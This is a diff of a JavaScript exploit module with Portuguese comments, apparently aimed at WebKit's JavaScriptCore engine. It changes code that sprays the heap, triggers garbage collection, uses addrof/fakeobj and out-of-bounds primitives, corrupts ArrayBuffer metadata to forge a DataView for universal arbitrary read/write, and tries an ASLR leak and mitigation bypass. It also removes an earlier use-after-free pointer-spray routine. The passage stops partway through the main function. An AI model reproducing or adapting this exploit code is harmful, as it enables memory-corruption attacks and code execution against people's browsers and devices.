@@ -1,11 +1,7 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v152 - Refinamento do Spray UAF e Tamanho da Vítima - Agressivo)
+// js/script3/testArrayBufferVictimCrash.mjs (v21 - Calculo ASLR CORRETO da Base WebKit)
 // =======================================================================================
-// ESTA É A VERSÃO FINAL QUE INTEGRA A CADEIA COMPLETA DE EXPLORAÇÃO, USANDO O UAF VALIDADO:
-// 1. Validar primitivas básicas (OOB local).
-// 2. Acionar Use-After-Free (UAF) para obter um ponteiro Double taggeado vazado.
-// 3. Desfazer o "tag" do ponteiro vazado e calcular a base ASLR da WebKit.
-// 4. Com a base ASLR, forjar um DataView para obter Leitura/Escrita Arbitrária Universal (ARB R/W).
-// 5. Testar e verificar a primitiva ARB R/W, incluindo leitura de gadgets.
+// ESTA VERSÃO TENTA BYPASSAR AS MITIGAÇÕES DO m_vector MANIPULANDO OFFSETS DE CONTROLE.
+// FOCO: Fortificar a estabilidade da alocação do ArrayBuffer/DataView usado para OOB.
 // =======================================================================================
 
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
@@ -16,27 +12,30 @@ import {
     addrof_core,
     fakeobj_core,
     initCoreAddrofFakeobjPrimitives,
-    arb_read, // Usado para operações internas da OOB principal (leitura/escrita de metadados)
-    arb_write, // Usado para operações internas da OOB principal (leitura/escrita de metadados)
+    arb_read,
+    arb_write,
     selfTestOOBReadWrite,
     oob_read_absolute,
-    oob_write_absolute
+    oob_write_absolute,
+    setupOOBMetadataForArbitraryAccess // Importar a nova função
 } from '../core_exploit.mjs';
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Full_UAF_ASLR_ARBRW_v152_AGRESSIVO";
+export const FNAME_MODULE = "v21 - Calculo ASLR CORRETO da Base WebKit"; // Versão atualizada
 
 // Aumentando as pausas para maior estabilidade em sistemas mais lentos ou com GC agressivo
 const LOCAL_VERY_SHORT_PAUSE = 10;
 const LOCAL_SHORT_PAUSE = 100;
-const LOCAL_MEDIUM_PAUSE = 750; // Aumentado
-const LOCAL_LONG_PAUSE = 1500; // Aumentado
+const LOCAL_MEDIUM_PAUSE = 750;
+const LOCAL_LONG_PAUSE = 1500;
+const LOCAL_SHORT_SHORT_PAUSE = 50;
+
+const EXPECTED_BUTTERFLY_ELEMENT_SIZE = 8; // Constante para JSValue (8 bytes)
 
 let global_spray_objects = [];
-let hold_objects = []; // Para evitar que o GC colete objetos críticos prematuramente
+let hold_objects = [];
 
-// Variáveis para a primitiva universal ARB R/W (serão configuradas após o vazamento de ASLR)
 let _fake_data_view = null;
 
 
@@ -45,14 +44,14 @@ async function dumpMemory(address, size, logFn, arbReadFn, sourceName = "Dump") 
     logFn(`[${sourceName}] Iniciando dump de ${size} bytes a partir de ${address.toString(true)}`, "debug");
     const bytesPerRow = 16;
     for (let i = 0; i < size; i += bytesPerRow) {
-        let hexLine = address.add(i).toString(true) + ": ";
+        let hexLine = address.add(i).toString(true) + ": "; 
         let asciiLine = "  ";
         let rowBytes = [];
 
         for (let j = 0; j < bytesPerRow; j++) {
             if (i + j < size) {
                 try {
-                    const byte = await arbReadFn(address.add(i + j), 1, logFn); // Note: logFn passado a arbReadFn
+                    const byte = await arbReadFn(address.add(i + j), 1, logFn);
                     rowBytes.push(byte);
                     hexLine += byte.toString(16).padStart(2, '0') + " ";
                     asciiLine += (byte >= 0x20 && byte <= 0x7E) ? String.fromCharCode(byte) : '.';
@@ -82,8 +81,7 @@ export async function arb_read_universal_js_heap(address, byteLength, logFn) {
     const fake_ab_backing_addr = addrof_core(_fake_data_view);
     const M_VECTOR_OFFSET_IN_BACKING_AB = fake_ab_backing_addr.add(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);
 
-    // Salvamos/restauramos o m_vector usando arb_read/arb_write (OOB local)
-    const original_m_vector_of_backing_ab = await arb_read(M_VECTOR_OFFSET_IN_BACKING_AB, 8); 
+    const original_m_vector_of_backing_ab = await arb_read(M_VECTOR_OFFSET_IN_BACKING_AB, 8);
     await arb_write(M_VECTOR_OFFSET_IN_BACKING_AB, address, 8);
 
     let result = null;
@@ -132,7 +130,7 @@ export async function arb_write_universal_js_heap(address, value, byteLength, lo
     } finally {
         await arb_write(M_VECTOR_OFFSET_IN_BACKING_AB, original_m_vector_of_backing_ab, 8);
     }
-    return value; // Retorna o valor escrito para consistência
+    return value;
 }
 
 // Funções para converter entre JS Double e AdvancedInt64 (do utils.mjs)
@@ -169,19 +167,26 @@ async function attemptUniversalArbitraryReadWriteWithMMode(logFn, pauseFn, JSC_O
     let backing_array_buffer = null;
 
     try {
-        backing_array_buffer = new ArrayBuffer(0x1000); // Tamanho suficiente para metadados
-        hold_objects.push(backing_array_buffer);
+        // Criar um ArrayBuffer de apoio real. Este será o objeto que será type-confused em DataView.
+        backing_array_buffer = new ArrayBuffer(0x1000);
+        hold_objects.push(backing_array_buffer); // Mantenha a referência para evitar GC.
         const backing_ab_addr = addrof_core(backing_array_buffer);
         logFn(`[${FNAME}] ArrayBuffer de apoio real criado em: ${backing_ab_addr.toString(true)}`, "info", FNAME);
 
-        // AQUI ESTAMOS USANDO AS PRIMITIVAS ARB_READ/ARB_WRITE DO CORE_EXPLOIT (que funcionam localmente)
-        // PARA CORROMPER OS METADADOS DO 'backing_array_buffer'.
+        // Corromper os metadados do ArrayBuffer de apoio para fazê-lo se parecer com um DataView.
+        // O primeiro campo (JSCell.structureID) é o ponteiro para a Structure, que contém a vtable.
         await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET), dataViewStructureVtableAddress, 8);
-        await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET), AdvancedInt64.Zero, 8); // Ponteiro de dados para 0, para não colidir imediatamente
-        await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START), 0xFFFFFFFF, 4); // Tamanho máximo
+        // O m_vector do ArrayBuffer subjacente (o que realmente aponta para os dados do ArrayBuffer)
+        // será zerado inicialmente, pois a primitiva ARB R/W universal irá manipulá-lo dinamicamente.
+        await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET), AdvancedInt64.Zero, 8);
+        // Expanda o tamanho do ArrayBuffer forjado para 0xFFFFFFFF (tamanho máximo possível)
+        await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START), 0xFFFFFFFF, 4);
+        // Configure o m_mode do ArrayBufferView (para o DataView forjado)
         await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBufferView.M_MODE_OFFSET), m_mode_to_try, 4);
+
         logFn(`[${FNAME}] Metadados de ArrayBuffer de apoio corrompidos para m_mode ${toHex(m_mode_to_try)}.`, "info", FNAME);
 
+        // Forjar o DataView a partir do endereço do ArrayBuffer corrompido.
         _fake_data_view = fakeobj_core(backing_ab_addr);
         if (!(_fake_data_view instanceof DataView)) {
             logFn(`[${FNAME}] FALHA: fakeobj_core não criou um DataView válido com m_mode ${toHex(m_mode_to_try)}! Construtor: ${_fake_data_view?.constructor?.name}`, "error", FNAME);
@@ -189,51 +194,38 @@ async function attemptUniversalArbitraryReadWriteWithMMode(logFn, pauseFn, JSC_O
         }
         logFn(`[${FNAME}] DataView forjado criado com sucesso: ${_fake_data_view} (typeof: ${typeof _fake_data_view})`, "good", FNAME);
 
-        // Testar a primitiva de leitura/escrita arbitrária universal recém-criada
+        // Testar a primitiva L/E Arbitrária Universal usando o DataView forjado.
+        // Vamos usar um objeto JS real como alvo para testar a escrita/leitura.
         const test_target_js_object = { test_prop: 0x11223344, second_prop: 0xAABBCCDD };
-        hold_objects.push(test_target_js_object);
+        hold_objects.push(test_target_js_object); // Garante que o objeto não seja coletado
         const test_target_js_object_addr = addrof_core(test_target_js_object);
 
-        // Antes de testar o _fake_data_view, precisamos apontar o m_vector dele para o endereço do nosso objeto de teste.
-        // O m_vector do _fake_data_view é na verdade o JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET dentro do `backing_array_buffer`.
-        const fake_dv_backing_ab_addr_for_mvector_control = backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);
-        await arb_write_universal_js_heap(fake_dv_backing_ab_addr_for_mvector_control, test_target_js_object_addr, 8, logFn);
-
+        // O DataView forjado (_fake_data_view) terá seu m_vector manipulado pela arb_read/write_universal_js_heap
+        // para apontar para o objeto de teste.
         const TEST_VALUE_UNIVERSAL = 0xDEADC0DE;
-        _fake_data_view.setUint32(0, TEST_VALUE_UNIVERSAL, true);
-        const read_back_from_fake_dv = _fake_data_view.getUint32(0, true);
+        await arb_write_universal_js_heap(test_target_js_object_addr, TEST_VALUE_UNIVERSAL, 4, logFn);
+        const read_back_from_fake_dv = await arb_read_universal_js_heap(test_target_js_object_addr, 4, logFn);
 
         if (test_target_js_object.test_prop === TEST_VALUE_UNIVERSAL && read_back_from_fake_dv === TEST_VALUE_UNIVERSAL) {
             logFn(`[${FNAME}] SUCESSO CRÍTICO: L/E Universal (heap JS) FUNCIONANDO com m_mode ${toHex(m_mode_to_try)}!`, "vuln", FNAME);
-            // Restaurar o ponteiro de dados do _fake_data_view para evitar corrupções futuras se ele for coletado
-            await arb_write_universal_js_heap(fake_dv_backing_ab_addr_for_mvector_control, AdvancedInt64.Zero, 8, logFn);
+            // IMPORTANTE: Restaurar o valor original do m_vector do DataView forjado para zero ou um valor seguro.
+            // A arb_read/write_universal_js_heap já faz isso, mas uma garantia extra é boa.
             return true;
         } else {
             logFn(`[${FNAME}] FALHA: L/E Universal (heap JS) INCONSISTENTE! Lido: ${toHex(read_back_from_fake_dv)}, Esperado: ${toHex(TEST_VALUE_UNIVERSAL)}.`, "error", FNAME);
             logFn(`    Objeto original.test_prop: ${toHex(test_target_js_object.test_prop)}`, "error", FNAME);
-            // Restaurar o ponteiro de dados mesmo em caso de falha
-            await arb_write_universal_js_heap(fake_dv_backing_ab_addr_for_mvector_control, AdvancedInt64.Zero, 8, logFn);
             return false;
         }
     } catch (e) {
         logFn(`[${FNAME}] ERRO durante teste de L/E Universal com m_mode ${toHex(m_mode_to_try)}: ${e.message}\n${e.stack || ''}`, "critical", FNAME);
-        // Tentar restaurar o ponteiro de dados do _fake_data_view, se possível, antes de retornar falso
-        try {
-            if (backing_array_buffer) {
-                const backing_ab_addr = addrof_core(backing_array_buffer);
-                const fake_dv_backing_ab_addr_for_mvector_control = backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);
-                await arb_write_universal_js_heap(fake_dv_backing_ab_addr_for_mvector_control, AdvancedInt64.Zero, 8, logFn);
-            }
-        } catch (cleanupErr) {
-            logFn(`[${FNAME}] ERRO durante limpeza (restauração do m_vector) após falha de L/E Universal: ${cleanupErr.message}`, "error", FNAME);
-        }
         return false;
     } finally {
+        // Limpeza: Liberar referências para permitir que o GC atue
         if (backing_array_buffer) {
             const index = hold_objects.indexOf(backing_array_buffer);
             if (index > -1) { hold_objects.splice(index, 1); }
         }
-        _fake_data_view = null; // Resetar para garantir que o próximo teste comece limpo
+        _fake_data_view = null;
     }
 }
 
@@ -243,135 +235,82 @@ async function attemptUniversalArbitraryReadWriteWithMMode(logFn, pauseFn, JSC_O
 // Função para forçar Coleta de Lixo
 async function triggerGC(logFn, pauseFn) {
     logFn("    Acionando GC...", "info", "GC_Trigger");
-    // Alocações grandes para forçar o GC. Mais agressivo.
     try {
-        for (let i = 0; i < 1000; i++) { // Aumentado para 1000 iterações
-            new ArrayBuffer(1024 * 256); // Aloca 256KB, total de 256MB
+        for (let i = 0; i < 500; i++) {
+            new ArrayBuffer(1024 * 256);
         }
     } catch (e) {
         logFn("    Memória esgotada durante o GC Trigger, o que é esperado e bom (força GC).", "info", "GC_Trigger");
     }
-    await pauseFn(LOCAL_SHORT_PAUSE); // Dá tempo para o GC executar
-    // Alocações pequenas para ajudar o GC a perceber a pressão
-    for (let i = 0; i < 50; i++) {
-        new ArrayBuffer(1024); // Aloca 1KB, 50 vezes
+    await pauseFn(LOCAL_SHORT_PAUSE);
+    for (let i = 0; i < 25; i++) {
+        new ArrayBuffer(1024);
     }
-    await pauseFn(LOCAL_SHORT_PAUSE); // Dar mais tempo para o GC.
+    await pauseFn(LOCAL_SHORT_PAUSE);
 }
 
-// Cria um objeto, o coloca em uma estrutura que causa otimizações,
-// e retorna uma referência a ele após a estrutura ser destruída.
-// A lógica aqui é a do seu OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R50_UAF.mjs
-async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM) {
-    let dangling_ref = null; // Esta será a referência pendurada
-    const VICTIM_SIZE_BYTES = 0x80; // Tamanho do objeto vítima para UAF (128 bytes)
+/**
+ * Tenta um Type Confusion direto para obter primitivas addrof/fakeobj.
+ * @param {Function} logFn Função de log.
+ * @param {Function} pauseFn Função de pausa.
+ * @param {object} JSC_OFFSETS_PARAM Offsets JSC.
+ * @returns {Promise<boolean>} True se addrof/fakeobj foram estabilizados.
+ */
+async function stabilizeAddrofFakeobjPrimitives(logFn, pauseFn, JSC_OFFSETS_PARAM) {
+    const FNAME = "stabilizeAddrofFakeobjPrimitives";
+    logFn(`[${FNAME}] Iniciando estabilização de addrof_core/fakeobj_core via Heisenbug.`, "subtest", FNAME);
 
-    // PASSO 1: Criar o objeto vítima que será liberado mas que teremos uma dangling_ref.
-    // O tipo de objeto aqui (Float64Array) é crucial para como o ponteiro será lido.
-    // Queremos que o Type Confusion ocorra quando o JS tentar ler dangling_ref[0]
-    // e encontre o valor que pulverizamos.
-    let victim_object_arr = new Float64Array(VICTIM_SIZE_BYTES / 8); // Float64Array para UAF (128 bytes = 16 doubles)
-    // Preencha com um valor inicial conhecido para debug. 
-    // É importante que o valor não seja 0, pois 0 pode ser confundido com um ponteiro nulo.
-    victim_object_arr[0] = 1.000000000000123; // Um double com valor hex: 0x3FF0000000000206
-    victim_object_arr[1] = 2.0;
+    initCoreAddrofFakeobjPrimitives();
 
-    // Para evitar que o GC colete 'victim_object_arr' antes que o dangling_ref seja criado.
-    hold_objects.push(victim_object_arr); 
-    
-    // A referência pendurada é a própria 'victim_object_arr'
-    // A confusão de tipos ocorre porque o motor JS ainda pensa que 'dangling_ref' é um Float64Array,
-    // mas a memória subjacente será reocupada por um ArrayBuffer.
-    dangling_ref = victim_object_arr;
+    const NUM_STABILIZATION_ATTEMPTS = 5;
+    for (let i = 0; i < NUM_STABILIZATION_ATTEMPTS; i++) {
+        logFn(`[${FNAME}] Tentativa de estabilização #${i + 1}/${NUM_STABILIZATION_ATTEMPTS}.`, "info", FNAME);
 
-    // Forçar otimizações (acessando a vítima repetidamente)
-    for (let i = 0; i < 1000; i++) { // Aumentado para mais otimizações
-        victim_object_arr[0] += 0.000000000000001; // Pequena alteração para forçar JIT
-    }
-    
-    logFn(`[UAF] Objeto vítima (Float64Array) criado e referência pendurada simulada.`, "info");
-    logFn(`[UAF] Endereço da referência pendurada (via addrof_core): ${addrof_core(dangling_ref).toString(true)}`, "info");
-    logFn(`[UAF] Valor inicial da ref. pendurada [0] (Float64): ${dangling_ref[0]} (Hex: ${toHex(_doubleToInt64_direct(dangling_ref[0]), 64)})`, "info");
+        hold_objects = [];
+        await triggerGC(logFn, pauseFn);
+        logFn(`[${FNAME}] Heap limpo antes da tentativa de estabilização.`, "info", FNAME);
+        await pauseFn(LOCAL_MEDIUM_PAUSE);
 
-    // PASSO 2: Forçar Coleta de Lixo para liberar a memória do 'victim_object_arr'
-    logFn("--- FASE 3: Forçando Coleta de Lixo para liberar a memória do objeto vítima ---", "subtest");
-    // Remova a referência 'victim_object_arr' do array de retenção para torná-lo elegível para GC.
-    // 'dangling_ref' ainda mantém uma referência, mas ela se tornará "pendurada" após o GC.
-    const ref_index = hold_objects.indexOf(victim_object_arr);
-    if (ref_index > -1) { hold_objects.splice(ref_index, 1); }
-    victim_object_arr = null; // Remova a última referência forte.
-    await triggerGC(logFn, pauseFn); 
-    logFn("    Memória do objeto-alvo liberada (se o GC atuou).", "info");
+        try {
+            let test_obj = { a: 0x11223344, b: 0x55667788 };
+            hold_objects.push(test_obj);
 
-    // PASSO 3: Pulverizar sobre a memória liberada com Float64Array contendo o ponteiro desejado.
-    logFn("--- FASE 4: Pulverizando Float64Array com ponteiros sobre a memória liberada (MAIS AGRESSIVO) ---", "subtest");
-    const spray_arrays = [];
-    const SPRAY_COUNT_UAF_NEW = 5000; // Aumentado para 5000 para maior agressividade
-    const SPRAY_BUF_SIZE_BYTES = VICTIM_SIZE_BYTES; // O tamanho da nova alocação deve corresponder ao da vítima
+            const addr = addrof_core(test_obj);
+            logFn(`[${FNAME}] addrof_core para test_obj (${test_obj.toString()}) resultou em: ${addr.toString(true)}`, "debug", FNAME);
 
-    // --- Determinar o ponteiro a ser pulverizado ---
-    // Usaremos o endereço do vtable da Structure de DataView (0x3AD62A0)
-    // Para fins de pulverização, precisamos de uma BASE ASLR TEMPORÁRIA para criar o ponteiro DOUBLE.
-    // ESTA PARTE É CRÍTICA: SE o 0x3AD62A0 NÃO É ONDE O VTABLE REALMENTE COMEÇA NA LIB, ISSO FALHARÁ.
-    // ESTE É UM ENDEREÇO RELATIVO À BASE DA LIB, NÃO UM ENDEREÇO ABSOLUTO DE VARIÁVEL GLOBAL.
-    // Você confirmou o 0x3AD62A0 é o offset do vtable.
-    // Assumiremos uma base hardcoded para CONSTRUIR O VALOR A SER PULVERIZADO.
-    // A base REAL será vazada pelo UAF.
-    // O valor 0x402a0000 é a "tag" de ponteiro de objeto para doubles.
-    // A base WebKit real começa geralmente em 0x....000 (alinhada em 0x1000), 
-    // mas a parte `high` do double JSValue usa 0x402a para indicar que é um ponteiro.
-    // Então, ao invés de usar uma base 0x00d44000, vamos focar em construir um double que
-    // represente um ponteiro válido JIT-compilável, se possível, para o endereço do vtable.
-    
-    // Para o spray inicial, queremos que o valor lido seja um ponteiro para a Structure da DataView.
-    // Um ponteiro de objeto em JSValue geralmente tem a tag 0x402a no high (para 64 bits).
-    // O offset do vtable da DataView é 0x3AD62A0.
-    // Então o valor que queremos pulverizar para ser lido é (possivelmente) um endereço como BASE_WEBKIT + OFFSET_VTABLE.
-    // Se a `addrof_core` já untagga, então o valor do spray **não deveria ter a tag**.
-    // Mas se o Type Confusion resultou em um `Float64Array` sendo lido onde o `victim_object_arr` estava,
-    // e esperamos que `dangling_ref[0]` nos dê um ponteiro `JSValue` (que tem a tag),
-    // então o valor do spray PRECISA ter a tag.
+            if (!isAdvancedInt64Object(addr) || addr.equals(AdvancedInt64.Zero) || addr.equals(AdvancedInt64.NaNValue)) {
+                logFn(`[${FNAME}] FALHA: addrof_core retornou endereço inválido para test_obj.`, "error", FNAME);
+                throw new Error("addrof_core falhou na estabilização.");
+            }
 
-    // Vamos assumir que a base da WebKit pode ser algo como 0x010000000000.
-    // Isso é uma ESTIMATIVA. O valor real será vazado depois.
-    const TEMPORARY_ESTIMATED_WEBKIT_BASE = new AdvancedInt64(0x00000000, 0x01000000); // Exemplo de base WebKit (apenas para simular um ponteiro)
-    const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64 = new AdvancedInt64(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 0); // O offset já é um número em hexadecimal na config
+            const faked_obj = fakeobj_core(addr);
+            
+            const original_val = faked_obj.a;
+            faked_obj.a = 0xDEADC0DE;
+            await pauseFn(LOCAL_VERY_SHORT_PAUSE);
+            const new_val = faked_obj.a;
 
-    let TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64 = TEMPORARY_ESTIMATED_WEBKIT_BASE.add(DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64);
-    
-    // AQUI ESTÁ O TRUQUE: O valor que o JS lê como double na posição 0 é um JSValue.
-    // JSValues que são ponteiros de objetos são "tagged". A tag comum para ponteiros de objeto (em doubles) é 0x402a no high.
-    // Então, o valor que precisamos pulverizar é o endereço do vtable COM ESSA TAG.
-    // Vamos adicionar essa tag ao High do AdvancedInt64 ANTES de converter para double.
-    const OBJECT_PTR_TAG_HIGH = 0x402a0000;
-    const tagged_high_for_spray = TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64.high() | OBJECT_PTR_TAG_HIGH;
-    TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64 = new AdvancedInt64(TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64.low(), tagged_high_for_spray);
-
-
-    const spray_value_double_to_leak_ptr = _int64ToDouble_direct(TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64);
-    logFn(`[UAF] Valor Double do VTable da Structure para pulverização (assumindo tag e base): ${toHex(_doubleToInt64_direct(spray_value_double_to_leak_ptr), 64)}`, "info");
-
-
-    for (let i = 0; i < SPRAY_COUNT_UAF_NEW; i++) {
-        const buf = new ArrayBuffer(SPRAY_BUF_SIZE_BYTES); 
-        const view = new Float64Array(buf);
-        view[0] = spray_value_double_to_leak_ptr; // Escreve o ponteiro da Structure no início do buffer
-        // Preenche o resto com marcadores
-        for (let j = 1; j < view.length; j++) {
-            view[j] = _int64ToDouble_direct(new AdvancedInt64(0xCDCDCDCD, 0xCDCDCDCD + j)); // Variar para facilitar a identificação se necessário
+            if (new_val === 0xDEADC0DE && test_obj.a === 0xDEADC0DE) {
+                logFn(`[${FNAME}] SUCESSO: addrof_core/fakeobj_core estabilizados e funcionando!`, "good", FNAME);
+                faked_obj.a = original_val;
+                return true;
+            } else {
+                logFn(`[${FNAME}] FALHA: addrof_core/fakeobj_core inconsistentes. Original: ${toHex(original_val)}, Escrito: ${toHex(0xDEADC0DE)}, Lido: ${toHex(new_val)}.`, "error", FNAME);
+                throw new Error("fakeobj_core falhou na estabilização.");
+            }
+        } catch (e) {
+            logFn(`[${FNAME}] Erro durante tentativa de estabilização: ${e.message}`, "warn", FNAME);
         }
-        spray_arrays.push(buf);
     }
-    hold_objects.push(spray_arrays); // Mantém os buffers em spray vivos.
-    logFn("    Pulverização de Float64Array concluída sobre a memória da vítima.", "info");
-    
-    return dangling_ref; // Retorna a referência pendurada que agora está "confusa"
+
+    logFn(`[${FNAME}] FALHA CRÍTICA: Não foi possível estabilizar as primitivas addrof_core/fakeobj_core após ${NUM_STABILIZATION_ATTEMPTS} tentativas.`, "critical", FNAME);
+    return false;
 }
 
 
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, pauseFn, JSC_OFFSETS_PARAM) {
-    const FNAME_CURRENT_TEST = "executeTypedArrayVictimAddrofAndWebKitLeak_R43";
-    const FNAME_CURRENT_TEST_BASE = "Full_UAF_ASLR_ARBRW_v152_AGRESSIVO"; // Nome mais curto para logs internos
+    const FNAME_CURRENT_TEST = "Teste Uaf Type Confusion - C/W Bypass";
+    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE;
     logFn(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Integração UAF/TC e Construção de ARB R/W Universal ---`, "test");
 
     let final_result = { success: false, message: "Exploração falhou ou não pôde ser verificada.", details: {} };
@@ -379,7 +318,10 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
     let webkit_base_address = null;
     let found_m_mode = null;
 
-    try {
+    // Declaração da variável fora do try/catch principal para evitar redeclaração
+    let DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE = null; 
+
+    try { // <-- Este é o 'try' principal da função executeTypedArrayVictimAddrofAndWebKitLeak_R43
         logFn("Limpeza inicial do ambiente OOB para garantir estado limpo...", "info");
         clearOOBEnvironment({ force_clear_even_if_not_setup: true });
 
@@ -396,11 +338,10 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
 
         logFn("--- FASE 1: Estabilização Inicial do Heap (Spray de Objetos AGRESSIVO) ---", "subtest");
         const sprayStartTime = performance.now();
-        const SPRAY_COUNT = 500000; // Aumentado para 500.000 objetos
-        logFn(`Iniciando spray de objetos (volume ${SPRAY_COUNT}) para estabilização inicial do heap e anti-GC...`, "info");
-        for (let i = 0; i < SPRAY_COUNT; i++) {
-            // Variar tamanhos para preencher diferentes "buracos" no heap
-            const dataSize = 50 + (i % 50); // De 50 a 99 elementos
+        const INITIAL_SPRAY_COUNT = 250000;
+        logFn(`Iniciando spray de objetos (volume ${INITIAL_SPRAY_COUNT}) para estabilização inicial do heap e anti-GC...`, "info");
+        for (let i = 0; i < INITIAL_SPRAY_COUNT; i++) {
+            const dataSize = 50 + (i % 50) * 16;
             global_spray_objects.push({ id: `spray_obj_${i}`, val1: 0xDEADBEEF + i, val2: 0xCAFEBABE + i, data: new Array(dataSize).fill(i % 255) });
         }
         logFn(`Spray de ${global_spray_objects.length} objetos concluído. Tempo: ${(performance.now() - sprayStartTime).toFixed(2)}ms`, "info");
@@ -413,6 +354,37 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         await triggerOOB_primitive({ force_reinit: true });
 
         const oob_data_view = getOOBDataView();
+        const oob_array_buffer = oob_data_view.buffer; // Obtenha a referência ao ArrayBuffer real
+        hold_objects.push(oob_array_buffer); // Mantenha o ArrayBuffer real referenciado para evitar GC
+        hold_objects.push(oob_data_view); // Mantenha o DataView real referenciado para evitar GC
+
+        // NOVO: Aquecer/Pin o oob_array_buffer_real diretamente aqui
+        logFn(`[FASE 2] Aquecendo/Pinando oob_array_buffer_real para estabilizar ponteiro CONTENTS_IMPL_POINTER.`, "info");
+        try {
+            if (oob_array_buffer && oob_array_buffer.byteLength > 0) {
+                const tempUint8View = new Uint8Array(oob_array_buffer);
+                // Acessos mais agressivos e variados para forçar o JIT a "fixar" o buffer
+                for (let i = 0; i < Math.min(tempUint8View.length, 0x1000); i += 8) { // Acessar a cada 8 bytes
+                    tempUint8View[i] = i % 255;
+                    tempUint8View[i+1] = (i+1) % 255;
+                    tempUint8View[i+2] = (i+2) % 255;
+                    tempUint8View[i+3] = (i+3) % 255;
+                    tempUint8View[i+4] = (i+4) % 255;
+                    tempUint8View[i+5] = (i+5) % 255;
+                    tempUint8View[i+6] = (i+6) % 255;
+                    tempUint8View[i+7] = (i+7) % 255;
+                }
+                 for (let i = 0; i < Math.min(tempUint8View.length, 0x1000); i += 8) {
+                    let val = tempUint8View[i]; // Lê para forçar atividade de memória
+                 }
+                logFn(`[FASE 2] oob_array_buffer_real aquecido/pinado com sucesso.`, "good");
+            }
+        } catch (e) {
+            logFn(`[FASE 2] ALERTA: Erro durante o aquecimento/pinning do oob_array_buffer_real: ${e.message}`, "warn");
+        }
+        // FIM do Aquecimento/Pinning
+
+
         if (!oob_data_view) {
             const errMsg = "Falha crítica ao obter primitiva OOB. DataView é nulo.";
             logFn(errMsg, "critical");
@@ -421,106 +393,116 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         logFn(`Ambiente OOB configurado com DataView: ${oob_data_view !== null ? 'Pronto' : 'Falhou'}. Time: ${(performance.now() - oobSetupStartTime).toFixed(2)}ms`, "good");
         await pauseFn(LOCAL_SHORT_PAUSE);
 
-        // Inicializar addrof_core e fakeobj_core
-        initCoreAddrofFakeobjPrimitives();
-        logFn("Primitivas PRINCIPAIS 'addrof' e 'fakeobj' operacionais e robustas.", "good");
+        const addrof_fakeobj_stable = await stabilizeAddrofFakeobjPrimitives(logFn, pauseFn, JSC_OFFSETS_PARAM);
+        if (!addrof_fakeobj_stable) {
+            const errMsg = "Falha crítica: Não foi possível estabilizar addrof_core/fakeobj_core. Abortando exploração.";
+            logFn(errMsg, "critical");
+            throw new Error(errMsg);
+        }
+        logFn("Primitivas PRINCIPAIS 'addrof' e 'fakeobj' ESTABILIZADAS e robustas.", "good");
+        await pauseFn(LOCAL_MEDIUM_PAUSE);
 
 
-        // --- FASE 2.5: Acionando UAF/Type Confusion e Vazando Ponteiro de Base ASLR ---
-        logFn("--- FASE 2.5: Acionando UAF/Type Confusion e Vazando Ponteiro de Base ASLR ---", "subtest");
-        
-        let leaked_jsvalue_from_uaf_double = 0; 
+        logFn("--- FASE 3: Vazamento de ASLR (Nova Tentativa com Modificações de Flags/Offsets) ---", "subtest");
+        const dummy_object_for_aslr_leak = { prop1: 0x1234, prop2: 0x5678 };
+        hold_objects.push(dummy_object_for_aslr_leak);
+        const dummy_object_addr = addrof_core(dummy_object_for_aslr_leak);
+        logFn(`[ASLR LEAK] Endereço de dummy_object_for_aslr_leak: ${dummy_object_addr.toString(true)}`, "info");
 
-        try {
-            const dangling_ref_from_uaf = await sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM);
+        // === NOVA LÓGICA DE BYPASS ===
+        // Esta lógica agora é executada *após* a validação das primitivas OOB locais na FASE 0.
+        logFn(`[ASLR LEAK] Tentando manipular flags/offsets do ArrayBuffer real para bypass da mitigação.`, "info");
 
-            // --- FASE 5 do UAF original: Encontrar a referência corrompida e extrair os ponteiros ---
-            if (!(dangling_ref_from_uaf instanceof Float64Array) || dangling_ref_from_uaf.length === 0) {
-                 logFn(`[UAF LEAK] ERRO: A referência pendurada não é um Float64Array ou está vazia após o spray. Tipo: ${Object.prototype.toString.call(dangling_ref_from_uaf)}`, "critical");
